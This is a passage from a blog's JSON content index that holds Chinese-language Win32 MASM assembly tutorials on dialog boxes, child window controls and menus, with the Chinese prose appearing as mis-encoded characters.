uMsg==WM_CLOSE invoke SendMessage,hWnd,WM_COMMAND,IDM_EXIT,0 .elseif uMsg==WM_COMMAND mov eax,wParam .if lParam==0 .if ax==IDM_GETTEXT invoke GetDlgItemText,hWnd,IDC_EDIT,addr buffer,512 invoke MessageBox,NULL,addr buffer,addr AppName,MB_OK .elseif ax==IDM_CLEAR invoke SetDlgItemText,hWnd,IDC_EDIT,NULL .elseif ax==IDM_EXIT invoke EndDialog,hWnd,NULL .endif .else mov edx,wParam shr edx,16 .if dx==BN_CLICKED .if ax==IDC_BUTTON invoke SetDlgItemText,hWnd,IDC_EDIT,addr TestString .elseif ax==IDC_EXIT invoke SendMessage,hWnd,WM_COMMAND,IDM_EXIT,0 .endif .endif .endif .else mov eax,FALSE ret .endif mov eax,TRUE ret DlgProc endp end start 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 ;-------------------------------------------------------------------------------- ;dialog.rc (part 2) ;-------------------------------------------------------------------------------- #include \u0026#34;c:\\masm32\\include\\RESOURCE.h\u0026#34; #define IDC_EDIT 3000 #define IDC_BUTTON 3001 #define IDC_EXIT 3002 #define IDM_GETTEXT 32000 #define IDM_CLEAR 32001 #define IDM_EXIT\t32003 MyDialog DIALOG 10,10,205,60 STYLE 0x0004 | DS_CENTER | WS_CAPTION | WS_MINIMIZEBOX | WS_SYSMENU | WS_VISIBLE | WS_OVERLAPPED | DS_MODALFRAME | DS_3DLOOK CAPTION \u0026#34;Our Second Dialog Box\u0026#34; MENU IDR_MENU1 { EDITTEXT IDC_EDIT, 15,17,111,13, ES_AUTOHSCROLL | ES_LEFT DEFPUSHBUTTON \u0026#34;Say Hello\u0026#34;, IDC_BUTTON, 141,10,52,13 PUSHBUTTON \u0026#34;E\u0026amp;xit\u0026#34;, IDC_EXIT, 141,26,52,13, WS_GROUP } IDR_MENU1 MENU { POPUP \u0026#34;Test Controls\u0026#34; { MENUITEM \u0026#34;Get Text\u0026#34;, IDM_GETTEXT MENUITEM \u0026#34;Clear Text\u0026#34;, IDM_CLEAR MENUITEM \u0026#34;\u0026#34;, , 0x0800 /*MFT_SEPARATOR*/ MENUITEM \u0026#34;E\u0026amp;xit\u0026#34;, IDM_EXIT } } åˆ†æå¦‚ä¸‹ï¼š\n1 DlgProc proto :DWORD,:DWORD,:DWORD,:DWORD æˆ‘ä»¬å·²ç»å®šä¹‰äº†DlgProcå‡½æ•°çš„åŸå‹ï¼Œæ‰€ä»¥å¯ä»¥ç”¨æ“ä½œç¬¦ADDRæ¥è·å¾—å®ƒçš„åœ°å€ï¼ˆADDRå¯ä»¥åœ¨è¿è¡Œæ—¶åŠ¨æ€åœ°è·å¾—æ ‡è¯†ç¬¦çš„æœ‰æ•ˆåœ°å€ï¼‰ï¼š\n1 invoke DialogBoxParam, hInstance, ADDR DlgName,NULL, addr DlgProc, NULL ä¸Šé¢çš„å‡ è¡Œè°ƒç”¨äº†å‡½æ•°DialogBoxParamï¼Œè¯¥å‡½æ•°æœ‰äº”ä¸ªå‚æ•°ï¼Œåˆ†åˆ«æ˜¯ï¼šå®ä¾‹å¥æŸ„ã€å¯¹è¯æ¡†æ¨¡æ¿çš„åå­—ã€çˆ¶çª—å£çš„å¥æŸ„ã€å¯¹è¯æ¡†è¿‡ç¨‹å‡½æ•°çš„åœ°å€ã€å’Œå¯¹è¯æ¡†ç›¸å…³çš„æ•°æ®ã€‚è¯¥å‡½æ•°äº§ç”Ÿä¸€ä¸ªæ¨¡å¼å¯¹è¯æ¡†ã€‚å¦‚æœä¸æ˜¾å¼åœ°å…³é—­è¯¥å‡½æ•°ä¸ä¼šè¿”å›ã€‚\n1 2 3 4 5 .IF uMsg==WM_INITDIALOG invoke GetDlgItem, hWnd,IDC_EDIT invoke SetFocus,eax .ELSEIF uMsg==WM_CLOSE invoke SendMessage,hWnd,WM_COMMAND,IDM_EXIT,0 é™¤äº†ä¸å¤„ç†WM_CREATEæ¶ˆæ¯å¤–å¯¹è¯æ¡†çš„çª—å£å¤„ç†è¿‡ç¨‹å‡½æ•°å’Œä¸€èˆ¬çš„çª—å£å¤„ç†è¿‡ç¨‹ç›¸ä¼¼ã€‚è¯¥è¿‡ç¨‹å‡½æ•°æ¥æ”¶åˆ°çš„ç¬¬ä¸€ä¸ªæ¶ˆæ¯æ˜¯WM_INITDIALOGã€‚é€šå¸¸æŠŠåˆå§‹åŒ–çš„ä»£ç æ”¾åˆ°æ­¤å¤„ã€‚æ³¨æ„å¦‚æœæ‚¨å¤„ç†è¯¥æ¶ˆæ¯å¿…é¡»åœ¨eaxä¸­è¿”å›TRUEã€‚å†…ç½®çš„å¯¹è¯æ¡†ç®¡ç†å‡½æ•°ä¸ä¼šæŠŠWM_DESTROY æ¶ˆæ¯å‘é€åˆ°å¯¹è¯æ¡†çš„æ¶ˆæ¯å¤„ç†å‡½æ•°ï¼Œæ‰€ä»¥å¦‚æœæˆ‘ä»¬æƒ³åœ¨å¯¹è¯æ¡†å…³é—­æ—¶è¿›è¡Œå¤„ç†ï¼Œå°±æŠŠå®ƒæ”¾åˆ°WM_CLOSEæ¶ˆæ¯çš„å¤„ç†ä¸­ã€‚åœ¨æˆ‘ä»¬çš„ä¾‹å­ä¸­æˆ‘ä»¬å‘é€æ¶ˆæ¯WM_COMMANDï¼Œå¹¶åœ¨å‚æ•°wParamä¸­æ”¾ç½®IDM_EXITï¼Œè¿™å’Œå¤„ç†WM_CLOSE æ¶ˆæ¯æ•ˆæœä¸€æ ·ï¼Œåœ¨å¤„ç†IDM_EXIT ä¸­æˆ‘ä»¬è°ƒç”¨EndDialogå‡½æ•°ã€‚å¦‚æœæˆ‘ä»¬æƒ³è¦é”€æ¯ä¸€ä¸ªå¯¹è¯æ¡†ï¼Œå¿…é¡»è°ƒç”¨EndDialogå‡½æ•°ï¼Œè¯¥å‡½æ•°å¹¶ä¸ä¼šç«‹å³é”€æ¯ä¸€ä¸ªçª—å£ï¼Œè€Œæ˜¯è®¾ç½®ä¸€ä¸ªæ ‡å¿—ä½ï¼Œç„¶åå¯¹è¯æ¡†ç®¡ç†å™¨ä¼šå¤„ç†æ¥ä¸‹å»çš„é”€æ¯å¯¹è¯æ¡†åŠ¨ä½œã€‚å¥½ï¼Œç°åœ¨æˆ‘ä»¬æ¥çœ‹çœ‹èµ„æºæ–‡ä»¶ï¼Œå…¶ä¸­æœ€æ˜¾è‘—çš„å˜åŒ–æ˜¯åœ¨æŒ‡å®šèœå•æ—¶æˆ‘ä»¬ä¸æ˜¯ç”¨å­—ç¬¦ä¸²æŒ‡å®šè¯¥èœå•çš„åç§°è€Œæ˜¯ç”¨äº†ä¸€ä¸ªå¸¸é‡ IDR_MENU1ã€‚åœ¨è°ƒç”¨DialogBoxParamäº§ç”Ÿçš„å¯¹è¯æ¡†ä¸­æŒ‚æ¥ä¸€ä¸ªèœå•å¿…é¡»è¿™ä¹ˆåšï¼Œæ³¨æ„åœ¨è¯¥å¯¹è¯æ¡†æ¨¡æ¿ä¸­ï¼Œåœ¨è¯¥æ ‡è¯†ç¬¦å‰å¿…é¡»åŠ MENUå…³é”®å­—ï¼Œè¿™ä¸¤ä¸ªä¾‹å­ä¸­çš„æ˜¾è‘—ä¸åŒæ˜¯åè€…æ²¡æœ‰å›¾æ ‡ï¼Œè¿™å¯ä»¥åœ¨å¤„ç†WM_INITDIALOGä¸­å‘é€æ¶ˆæ¯WM_SETICONæ¶ˆæ¯ï¼Œç„¶ååœ¨è¯¥æ¶ˆæ¯å¤„ç†ä»£ç ä¸­ä½œé€‚å½“çš„å¤„ç†å³å¯ã€‚\n","permalink":"https://www.hacktech.cn/post/win32-asm-study-10.html","summary":"\u003cp\u003eç°åœ¨æˆ‘ä»¬å¼€å§‹å­¦ä¹ ä¸€äº›æœ‰å…³GUIç¼–ç¨‹çš„æœ‰è¶£çš„éƒ¨åˆ†ï¼šä»¥å¯¹è¯æ¡†ä¸ºä¸»è¦ç•Œé¢çš„åº”ç”¨ç¨‹åºã€‚\u003c/p\u003e","title":"Win32æ±‡ç¼–å­¦ä¹ (10)ï¼šå¯¹è¯æ¡†(1)"},{"content":"è¿™æ¬¡æˆ‘ä»¬å°†æ¢è®¨æ§ä»¶ï¼Œè¿™äº›æ§ä»¶æ˜¯æˆ‘ä»¬ç¨‹åºä¸»è¦çš„è¾“å…¥è¾“å‡ºè®¾å¤‡ã€‚\nç†è®ºï¼š WINDOWS æä¾›äº†å‡ ä¸ªé¢„å®šä¹‰çš„çª—å£ç±»ä»¥æ–¹ä¾¿æˆ‘ä»¬çš„ä½¿ç”¨ã€‚å¤§å¤šæ•°æ—¶é—´å†…ï¼Œæˆ‘ä»¬æŠŠå®ƒä»¬ç”¨åœ¨å¯¹è¯æ¡†ä¸­ï¼Œæ‰€ä»¥æˆ‘ä»¬ä¸€èˆ¬å°±å®ƒä»¬å«åšå­çª—å£æ§ä»¶ã€‚å­çª—å£æ§ä»¶ä¼šè‡ªå·±å¤„ç†æ¶ˆæ¯ï¼Œå¹¶åœ¨è‡ªå·±çŠ¶æ€å‘ç”Ÿæ”¹å˜æ—¶é€šçŸ¥çˆ¶çª—å£ã€‚è¿™æ ·å°±å¤§å¤§åœ°å‡è½»äº†æˆ‘ä»¬çš„ç¼–ç¨‹å·¥ä½œï¼Œæ‰€ä»¥æˆ‘ä»¬åº”å°½å¯èƒ½åœ°åˆ©ç”¨å®ƒä»¬ã€‚æœ¬è¯¾ä¸­æˆ‘ä»¬æŠŠè¿™äº›æ§ä»¶æ”¾åœ¨çª—å£ä¸­ä»¥ç®€åŒ–ç¨‹åºï¼Œä½†æ˜¯å¤§å¤šæ•°æ—¶é—´å†…å­çª—å£æ§ä»¶éƒ½æ˜¯æ”¾åœ¨å¯¹è¯æ¡†ä¸­çš„ã€‚æˆ‘ä»¬ç¤ºä¾‹ä¸­æ¼”ç¤ºçš„å­çª—å£æ§ä»¶åŒ…æ‹¬ï¼šæŒ‰é’®ã€ä¸‹æ‹‰èœå•ã€æ£€æŸ¥æ¡†ã€å•é€‰æŒ‰é’®ã€ç¼–è¾‘æ¡†ç­‰ã€‚ä½¿ç”¨å­çª—å£æ§ä»¶æ—¶ï¼Œå…ˆè°ƒç”¨CreateWindow æˆ– CreateWindowExã€‚åœ¨è¿™é‡Œç”±äºWINDOWS å·²ç»æ³¨å†Œäº†è¿™äº›å­æ§ä»¶ï¼Œæ‰€ä»¥æ— é¡»æˆ‘ä»¬å†æ³¨å†Œã€‚å½“ç„¶æˆ‘ä»¬ä¸èƒ½æ”¹å˜å®ƒä»¬çš„ç±»åç§°ã€‚è­¬å¦‚ï¼šå¦‚æœæ‚¨æƒ³äº§ç”Ÿä¸€ä¸ªæŒ‰é’®ï¼Œåœ¨è°ƒç”¨ä¸Šè¿°ä¸¤ä¸ªå‡½æ•°æ—¶å°±å¿…é¡»æŒ‡å®šç±»åä¸º\u0026quot;button\u0026quot;ã€‚å…¶ä»–å¿…é¡»æŒ‡å®šçš„å‚æ•°è¿˜æœ‰çˆ¶çª—å£çš„å¥æŸ„å’Œå°†è¦äº§ç”Ÿçš„å­æ§ä»¶çš„IDå·ã€‚å­æ§ä»¶çš„IDå·æ˜¯ç”¨æ¥æ ‡è¯†å­æ§ä»¶çš„ï¼Œæ•…ä¹Ÿå¿…é¡»æ˜¯å”¯ä¸€ çš„ã€‚å­æ§ä»¶äº§ç”Ÿåï¼Œå½“å…¶çŠ¶æ€æ”¹å˜æ—¶å°†ä¼šå‘çˆ¶çª—å£å‘é€æ¶ˆæ¯ã€‚ä¸€èˆ¬æˆ‘ä»¬åº”åœ¨çˆ¶çª—å£çš„WM_CREATEæ¶ˆæ¯ä¸­äº§ç”Ÿå­æ§ä»¶ã€‚å­æ§ä»¶å‘çˆ¶çª—å£å‘é€çš„æ¶ˆæ¯æ˜¯WM_COMMANDï¼Œå¹¶åœ¨ä¼ é€’çš„å‚æ•°wParaçš„ä½ä½ä¸­åŒ…æ‹¬æ§ä»¶çš„IDå·ï¼Œæ¶ˆæ¯å·åœ¨wParamçš„é«˜ä½ï¼ŒlParamä¸­åˆ™åŒ…æ‹¬äº†å­æ§ä»¶çš„çª—å£çš„å¥æŸ„ã€‚å„ç±»æ§ä»¶æœ‰ä¸åŒçš„æ¶ˆæ¯ä»£ç é›†ï¼Œè¯¦æƒ…è¯·å‚è§WIN32 APIå‚è€ƒæ‰‹å†Œã€‚çˆ¶çª—å£ä¹Ÿå¯ä»¥é€šè¿‡è°ƒç”¨å‡½æ•°SendMessageå‘å­æ§ä»¶å‘é€æ¶ˆæ¯ï¼Œå…¶ä¸­ç¬¬ä¸€ä¸ªå‚æ•°æ˜¯å­æ§ä»¶çš„çª—å£å¥æŸ„ï¼Œç¬¬äºŒä¸ªå‚æ•°æ˜¯è¦å‘é€çš„æ¶ˆæ¯å·ï¼Œé™„åŠ çš„å‚æ•°å¯ä»¥åœ¨wParamå’ŒlParamä¸­ä¼ é€’ï¼Œå…¶å®åªè¦çŸ¥é“äº†æŸä¸ªçª—å£çš„å¥æŸ„å°±å¯ä»¥ç”¨è¯¥å‡½æ•°å‘å…¶å‘é€ç›¸å…³æ¶ˆæ¯ã€‚æ‰€ä»¥äº§ç”Ÿäº†å­çª—å£åå¿…é¡»å¤„ç†WM_COMMANDæ¶ˆæ¯ä»¥ä¾¿å¯ä»¥æ¥æ”¶åˆ°å­æ§ä»¶çš„æ¶ˆæ¯ã€‚\nä¾‹å­ï¼š æˆ‘ä»¬å°†å†™ä¸€ä¸ªçª—å£ï¼Œåœ¨è¯¥çª—å£ä¸­æœ‰ä¸€ä¸ªç¼–è¾‘æ¡†å’Œä¸€ä¸ªæŒ‰é’®ã€‚å½“æ‚¨æŒ‰ä¸‹æŒ‰é’®æ—¶ ï¼Œä¼šå¼¹å‡ºä¸€ä¸ªå¯¹è¯æ¡†å…¶ä¸­æ˜¾ç¤ºäº†æ‚¨åœ¨ç¼–è¾‘æ¡†ä¸­è¾“å…¥çš„å†…å®¹ã€‚å¦å¤–ï¼Œè¯¥åº”ç”¨ç¨‹åºè¿˜æœ‰ä¸€ä¸ªèœå•ï¼Œå…¶ä¸­æœ‰å››ä¸ªèœå•é¡¹ï¼š\nSay Hello \u0026ndash; æŠŠä¸€ä¸ªå­—ç¬¦ä¸²è¾“å…¥ç¼–è¾‘æ§ä»¶ï¼› Clear Edit Box \u0026ndash; æ¸…é™¤ç¼–è¾‘æ§ä»¶ä¸­çš„å­—ç¬¦ä¸²ï¼› Get Text \u0026ndash; å¼¹å‡ºå¯¹è¯æ¡†æ˜¾ç¤ºç¼–è¾‘æ§ä»¶ä¸­çš„å­—ç¬¦ä¸²ï¼› Exit \u0026ndash; é€€å‡ºåº”ç”¨ç¨‹åºã€‚ 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 121 122 123 124 .386 .model flat,stdcall option casemap:none WinMain proto :DWORD,:DWORD,:DWORD,:DWORD include \\masm32\\include\\windows.inc include \\masm32\\include\\user32.inc include \\masm32\\include\\kernel32.inc includelib \\masm32\\lib\\user32.lib includelib \\masm32\\lib\\kernel32.lib .data ClassName db \u0026#34;SimpleWinClass\u0026#34;,0 AppName db \u0026#34;Our First Window\u0026#34;,0 MenuName db \u0026#34;FirstMenu\u0026#34;,0 ButtonClassName db \u0026#34;button\u0026#34;,0 ButtonText db \u0026#34;My First Button\u0026#34;,0 EditClassName db \u0026#34;edit\u0026#34;,0 TestString db \u0026#34;Wow! I\u0026#39;m in an edit box now\u0026#34;,0 .data? hInstance HINSTANCE ? CommandLine LPSTR ? hwndButton HWND ? hwndEdit HWND ? buffer db 512 dup(?) ; buffer to store the text retrieved from the edit box .const ButtonID equ 1 ; The control ID of the button control EditID equ 2 ; The control ID of the edit control IDM_HELLO equ 1 IDM_CLEAR equ 2 IDM_GETTEXT equ 3 IDM_EXIT equ 4 .code start: invoke GetModuleHandle, NULL mov hInstance,eax invoke GetCommandLine mov CommandLine,eax invoke WinMain, hInstance,NULL,CommandLine, SW_SHOWDEFAULT invoke ExitProcess,eax WinMain proc hInst:HINSTANCE,hPrevInst:HINSTANCE,CmdLine:LPSTR,CmdShow:DWORD LOCAL wc:WNDCLASSEX LOCAL msg:MSG LOCAL hwnd:HWND mov wc.cbSize,SIZEOF WNDCLASSEX mov wc.style, CS_HREDRAW or CS_VREDRAW mov wc.lpfnWndProc, OFFSET WndProc mov wc.cbClsExtra,NULL mov wc.cbWndExtra,NULL push hInst pop wc.hInstance mov wc.hbrBackground,COLOR_BTNFACE+1 mov wc.lpszMenuName,OFFSET MenuName mov wc.lpszClassName,OFFSET ClassName invoke LoadIcon,NULL,IDI_APPLICATION mov wc.hIcon,eax mov wc.hIconSm,eax invoke LoadCursor,NULL,IDC_ARROW mov wc.hCursor,eax invoke RegisterClassEx, addr wc invoke CreateWindowEx,WS_EX_CLIENTEDGE,ADDR ClassName, \\ ADDR AppName, WS_OVERLAPPEDWINDOW,\\ CW_USEDEFAULT, CW_USEDEFAULT,\\ 300,200,NULL,NULL, hInst,NULL mov hwnd,eax invoke ShowWindow, hwnd,SW_SHOWNORMAL invoke UpdateWindow, hwnd .WHILE TRUE invoke GetMessage, ADDR msg,NULL,0,0 .BREAK .IF (!eax) invoke TranslateMessage, ADDR msg invoke DispatchMessage, ADDR msg .ENDW mov eax,msg.wParam ret WinMain endp WndProc proc hWnd:HWND, uMsg:UINT, wParam:WPARAM, lParam:LPARAM .IF uMsg==WM_DESTROY invoke PostQuitMessage,NULL .ELSEIF uMsg==WM_CREATE invoke CreateWindowEx,WS_EX_CLIENTEDGE, ADDR EditClassName,NULL,\\ WS_CHILD or WS_VISIBLE or WS_BORDER or ES_LEFT or\\ ES_AUTOHSCROLL,\\ 50,35,200,25,hWnd,8,hInstance,NULL mov hwndEdit,eax invoke SetFocus, hwndEdit invoke CreateWindowEx,NULL, ADDR ButtonClassName,ADDR ButtonText,\\ WS_CHILD or WS_VISIBLE or BS_DEFPUSHBUTTON,\\ 75,70,140,25,hWnd,ButtonID,hInstance,NULL mov hwndButton,eax .ELSEIF uMsg==WM_COMMAND mov eax,wParam .IF lParam==0 .IF ax==IDM_HELLO invoke SetWindowText,hwndEdit,ADDR TestString .ELSEIF ax==IDM_CLEAR invoke SetWindowText,hwndEdit,NULL .ELSEIF ax==IDM_GETTEXT invoke GetWindowText,hwndEdit,ADDR buffer,512 invoke MessageBox,NULL,ADDR buffer,ADDR AppName,MB_OK .ELSE invoke DestroyWindow,hWnd .ENDIF .ELSE .IF ax==ButtonID shr eax,16 .IF ax==BN_CLICKED invoke SendMessage,hWnd,WM_COMMAND,IDM_GETTEXT,0 .ENDIF .ENDIF .ENDIF .ELSE invoke DefWindowProc,hWnd,uMsg,wParam,lParam ret .ENDIF xor eax,eax ret WndProc endp end start menu.rc\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 #define IDM_HELLO 1 #define IDM_CLEAR 2 #define IDM_GETTEXT 3 #define IDM_EXIT 4 SecondMenu MENU { POPUP \u0026#34;\u0026amp;PopUp\u0026#34; { MENUITEM \u0026#34;\u0026amp;Say Hello\u0026#34;,IDM_HELLO MENUITEM \u0026#34;\u0026amp;Clear\u0026#34;, IDM_CLEAR MENUITEM SEPARATOR MENUITEM \u0026#34;E\u0026amp;xit\u0026#34;,IDM_EXIT } MENUITEM \u0026#34;\u0026amp;Text\u0026#34;,IDM_GETTEXT } åˆ†æï¼š æˆ‘ä»¬ç°åœ¨å¼€å§‹åˆ†æï¼Œ\n1 2 3 4 5 6 7 8 9 10 11 12 13 .ELSEIF uMsg==WM_CREATE invoke CreateWindowEx,WS_EX_CLIENTEDGE, \\ ADDR EditClassName,NULL,\\ WS_CHILD or WS_VISIBLE or WS_BORDER or ES_LEFT\\ or ES_AUTOHSCROLL,\\ 50,35,200,25,hWnd,EditID,hInstance,NULL mov hwndEdit,eax invoke SetFocus, hwndEdit invoke CreateWindowEx,NULL, ADDR ButtonClassName,\\ ADDR ButtonText,\\ WS_CHILD or WS_VISIBLE or BS_DEFPUSHBUTTON,\\ 75,70,140,25,hWnd,ButtonID,hInstance,NULL mov hwndButton,eax æˆ‘ä»¬åœ¨WM_CREATEä¸­äº§ç”Ÿå­æ§ä»¶ï¼Œå…¶ä¸­åœ¨å‡½æ•°CreateWindowExä¸­ç»™å­æ§ä»¶çª—å£ä¸€ä¸ªWS_EX_CLIENTEDGEé£æ ¼ï¼Œå®ƒä½¿å¾—å­æ§ä»¶çª—å£çœ‹ä¸Šå»è¾¹ç•Œä¸‹å‡¹ï¼Œå…·æœ‰ç«‹ä½“æ„Ÿã€‚æ¯ä¸€ä¸ªå­æ§ä»¶çš„ç±»åéƒ½æ˜¯é¢„å®šä¹‰çš„ï¼Œè­¬å¦‚ï¼šæŒ‰é’®çš„é¢„å®šä¹‰ç±»åæ˜¯\u0026quot;button\u0026quot;ï¼Œç¼–è¾‘æ¡†æ˜¯\u0026quot;edit\u0026quot;ã€‚æ¥ä¸‹æ¥çš„å‚æ•°æ˜¯çª—å£é£æ ¼ï¼Œé™¤äº†é€šå¸¸çš„çª—å£é£æ ¼å¤–ï¼Œæ¯ä¸€ä¸ªæ§ä»¶éƒ½æœ‰è‡ªå·±çš„æ‰©å±•é£æ ¼ï¼Œè­¬å¦‚ï¼šæŒ‰é’®ç±»çš„æ‰©å±•é£æ ¼å‰é¢åŠ æœ‰BS_ï¼Œç¼–è¾‘æ¡†ç±»åˆ™æ˜¯ï¼šES_ï¼ŒWIN32 API å‚è€ƒä¸­æœ‰æ‰€æœ‰çš„æ‰©å±•é£æ ¼çš„æè¿°ã€‚æ³¨æ„ï¼šæ‚¨åœ¨CreateWindowsExå‡½æ•°ä¸­æœ¬æ¥è¦ä¼ é€’èœå•å¥æŸ„çš„åœ°æ–¹ä¼ å…¥å­çª—å£ç©ºé—´çš„IDå·ä¸ä¼šæœ‰ä»€ä¹ˆå‰¯ä½œç”¨ï¼Œå› ä¸ºå­çª—å£æ§ä»¶æœ¬èº«ä¸èƒ½æœ‰èœå•ã€‚äº§ç”Ÿæ§ä»¶åï¼Œæˆ‘ä»¬ä¿å­˜å®ƒä»¬çš„å¥æŸ„ï¼Œç„¶åè°ƒç”¨SetFocusæŠŠç„¦ç‚¹è®¾åˆ°ç¼–è¾‘æ§ä»¶ä¸Šä»¥ä¾¿ç”¨æˆ·ç«‹å³å¯ä»¥è¾“å…¥ã€‚æ¥ä¸‹æ¥çš„æ˜¯å¦‚ä½•å¤„ç†æ§ä»¶å‘é€çš„é€šçŸ¥æ¶ˆæ¯WM_COMMANDï¼š\n1 2 3 .ELSEIF uMsg==WM_COMMAND mov eax,wParam .IF lParam==0 æˆ‘ä»¬ä»¥å‰è®²è¿‡é€‰æ‹©èœå•é¡¹ä¹Ÿä¼šå‘é€WM_COMMANDæ¶ˆæ¯ï¼Œé‚£æˆ‘ä»¬åº”å¦‚ä½•åŒºåˆ†å‘¢ï¼Ÿçœ‹äº†ä¸‹è¡¨æ‚¨å°±ä¼šä¸€ç›®äº†ç„¶ï¼š\n1 2 3 4 5 6 7 /---------+--------------------+--------------------+---------------------\\ | | Low word of wParam |High word of wParam | lParam | +---------+--------------------+--------------------+---------------------+ | Menu | Menu ID | 0 | 0 | +---------+ -------------------+--------------------+---------------------+ | Control | Control ID | Notification code | Child Window Handle | \\---------+--------------------+--------------------+---------------------/ å…¶ä¸­æˆ‘ä»¬å¯ä»¥çœ‹åˆ°ä¸èƒ½ç”¨wParamæ¥åŒºåˆ†ï¼Œå› ä¸ºèœå•å’Œæ§ä»¶çš„IDå·å¯èƒ½ç›¸åŒï¼Œè€Œä¸”å­çª—å£ç©ºé—´çš„æ¶ˆæ¯å·ä¹Ÿæœ‰å¯èƒ½ä¸º0ã€‚\n1 2 3 4 5 6 7 .IF ax==IDM_HELLO invoke SetWindowText,hwndEdit,ADDR TestString .ELSEIF ax==IDM_CLEAR invoke SetWindowText,hwndEdit,NULL .ELSEIF ax==IDM_GETTEXT invoke GetWindowText,hwndEdit,ADDR buffer,512 invoke MessageBox,NULL,ADDR buffer,ADDR AppName,MB_OK æ‚¨å¯ä»¥è°ƒç”¨SetWindowTextå‡½æ•°æŠŠä¸€å­—ç¬¦ä¸²å¤åˆ¶åˆ°ç¼–è¾‘æ§ä»¶ä¸­å»ï¼Œä¸ºäº†æ¸…ç©ºï¼Œä¼ å…¥NULLå€¼ã€‚SetWindowTextæ˜¯ä¸€ä¸ªé€šç”¨å‡½æ•°ï¼Œå³å¯ä»¥ç”¨å®ƒæ¥è®¾å®šä¸€ä¸ªçª—å£çš„æ ‡é¢˜ï¼Œä¹Ÿå¯ä»¥ç”¨å®ƒæ¥æ”¹å˜ä¸€ä¸ªæŒ‰é’®ä¸Šçš„æ–‡å­—ã€‚å¦‚æœæ˜¯è¦å¾—åˆ°æŒ‰é’®ä¸Šçš„æ–‡å­—ï¼Œåˆ™è°ƒç”¨GetWindowTextã€‚\n1 2 3 4 5 6 .IF ax==ButtonID shr eax,16 .IF ax==BN_CLICKED invoke SendMessage,hWnd,WM_COMMAND,IDM_GETTEXT,0 .ENDIF .ENDIF ä¸Šé¢çš„ç‰‡æ®µæ˜¯å¤„ç†ç”¨æˆ·æŒ‰é’®äº‹ä»¶çš„ã€‚ä»–é¦–å…ˆæ£€æŸ¥wParamçš„é«˜å­—èŠ‚çœ‹æ˜¯å¦æ˜¯æŒ‰é’®çš„ID å·ï¼Œè‹¥æ˜¯åˆ™æ£€æŸ¥ä½å­—èŠ‚çœ‹å‘é€çš„æ¶ˆæ¯å·æ˜¯å¦BN_CLICKEDï¼Œè¯¥æ¶ˆæ¯æ˜¯åœ¨æŒ‰é’®æŒ‰ä¸‹æ—¶å‘é€çš„ï¼Œå¦‚æœä¸€åˆ‡éƒ½å¯¹ï¼Œåˆ™è½¬å…¥å¤„ç†è¯¥æ¶ˆæ¯ï¼Œæˆ‘ä»¬å¯ä»¥ä»å¤„ç†æ¶ˆæ¯IDM_GETTEXTå¤„å¤åˆ¶å…¨éƒ¨çš„ä»£ç ï¼Œä½†æ˜¯æ›´ä¸“ä¸šçš„åŠæ³•æ˜¯åœ¨å‘é€ä¸€æ¡IDM_GETTEXTæ¶ˆæ¯è®©ä¸»çª—å£è¿‡ç¨‹å¤„ç†ï¼Œè¿™åªè¦æŠŠä¼ é€çš„æ¶ˆæ¯è®¾ç½®ä¸ºWM_COMMANDï¼Œå†æŠŠwParamçš„ä½å­—èŠ‚ä¸­è®¾ç½®ä¸ºIDM_GETTEXTå³å¯ã€‚è¿™æ ·ä¸€æ¥æ‚¨çš„ä»£ç å°±ç®€æ´äº†è®¸å¤šï¼Œæ‰€ä»¥å°½å¯èƒ½åˆ©ç”¨è¯¥æŠ€å·§ã€‚æœ€åï¼Œå½“ç„¶ä¸æ˜¯æˆ–æœ‰æˆ–æ— ï¼Œå¿…é¡»åœ¨æ¶ˆæ¯å¾ªç¯ä¸­è°ƒç”¨å‡½æ•°TranslateMessageï¼Œå› ä¸ºæ‚¨çš„åº”ç”¨ç¨‹åºéœ€è¦åœ¨ç¼–è¾‘æ¡†ä¸­è¾“å…¥å¯è¯»çš„æ–‡å­—ã€‚å¦‚æœçœç•¥äº†è¯¥å‡½æ•°ï¼Œå°±ä¸èƒ½åœ¨ç¼–è¾‘æ¡†ä¸­è¾“å…¥ä»»ä½•ä¸œè¥¿ã€‚\n","permalink":"https://www.hacktech.cn/post/win32-asm-study-9.html","summary":"\u003cp\u003eè¿™æ¬¡æˆ‘ä»¬å°†æ¢è®¨æ§ä»¶ï¼Œè¿™äº›æ§ä»¶æ˜¯æˆ‘ä»¬ç¨‹åºä¸»è¦çš„è¾“å…¥è¾“å‡ºè®¾å¤‡ã€‚\u003c/p\u003e","title":"Win32æ±‡ç¼–å­¦ä¹ (9)ï¼šçª—å£æ§ä»¶"},{"content":"è¿™æ¬¡æˆ‘ä»¬å°†åœ¨æˆ‘ä»¬çš„åº”ç”¨ç¨‹åºä¸­åŠ å…¥ä¸€ä¸ªèœå•ã€‚\nç†è®ºï¼š èœå•å¯ä»¥è¯´æ˜¯WINDOWSæœ€é‡è¦çš„å…ƒç´ ä¹‹ä¸€ã€‚æœ‰äº†å®ƒï¼Œç”¨æˆ·å¯ä»¥æ–¹ä¾¿åœ°é€‰æ‹©æ“ä½œå‘½ä»¤.ç”¨æˆ·åªè¦ç»†è¯»ä¸€ä¸‹æ‰€æœ‰çš„èœå•é¡¹å°±å¯ä»¥æ˜äº†åº”ç”¨ç¨‹åºæ‰€æä¾›çš„å¤§æ¦‚åŠŸèƒ½,è€Œä¸”å¯ä»¥ç«‹å³æ“ä½œ,æ— é¡»å»é˜…è¯»æ‰‹å†Œäº†.æ­£å› ä¸ºèœå•ç»™äº†ç”¨æˆ·ä¸€ç§æ–¹ä¾¿çš„æ–¹å¼,æ‰€ä»¥æ‚¨åœ¨åº”ç”¨ç¨‹åºä¸­åŠ å…¥èœå•æ—¶å°±è¦éµå®ˆä¸€èˆ¬çš„æ 